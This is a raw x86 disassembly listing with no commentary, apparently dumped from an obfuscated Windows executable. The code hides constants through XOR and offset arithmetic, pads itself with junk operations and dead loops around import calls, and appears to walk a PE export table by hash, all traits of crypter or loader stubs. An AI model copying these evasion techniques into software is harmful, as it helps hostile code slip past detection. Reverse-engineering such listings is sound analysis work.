  41adc9:	ins    BYTE PTR es:[edi],dx
  41adca:	dec    edi
  41adcb:	dec    ebp
  41adcc:	fst    DWORD PTR [ebp-0x207e3c5c]
  41add2:	pushf  
  41add3:	test   al,0x8a
  41add5:	inc    edx
  41add6:	fs ret 0x4fa
  41adda:	bound  edi,QWORD PTR [ebx+0x44e60c86]
  41ade0:	in     al,dx
  41ade1:	mov    WORD PTR [esi+ecx*4],ds
  41ade4:	aaa    
  41ade5:	bound  ebp,QWORD PTR [eax-0x7c]
  41ade8:	mov    bh,0xa8
  41adea:	pusha  
  41adeb:	dec    edi
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c56
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ad6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cde
  41afcc:	mov    ecx,DWORD PTR ds:0x421a4e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x423892
  41b017:	push   0x423812
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c56
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237ed
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423804
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c76
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bcc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423962
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ab1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
